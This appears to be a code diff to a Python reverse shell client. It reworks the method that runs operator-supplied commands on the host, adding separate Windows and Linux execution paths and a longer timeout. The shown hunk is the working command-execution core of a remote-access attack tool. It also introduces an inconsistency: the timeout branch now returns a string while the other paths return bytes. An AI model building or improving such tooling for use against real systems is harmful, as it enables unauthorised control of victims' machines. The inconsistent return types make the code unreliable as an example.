@@ -43,19 +43,29 @@ class ReverseShellClient:
         self.current_dir = os.getcwd()
         self.old_dir = ""
         self.alive = True
-    
+
     def run_command(self, cmd):
         try:
-            process = subprocess.Popen(cmd,
-                                     shell=True,
-                                     stdout=subprocess.PIPE,
-                                     stderr=subprocess.PIPE,
-                                     stdin=subprocess.PIPE)
-            output, error = process.communicate(timeout=5)
+            if os.name == 'nt':  # Windows
+                process = subprocess.Popen(
+                    cmd,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE
+                )
+            else:  # Linux
+                process = subprocess.Popen(
+                    ['/bin/bash', '-c', cmd], 
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE
+                )
+            output, error = process.communicate(timeout=15)
             return output + error
         except subprocess.TimeoutExpired:
             process.kill()
-            return b"Error: Command timed out"
+            return "Error: Command timed out"
         except Exception as e:
             return f"Error: {e}".encode()
     
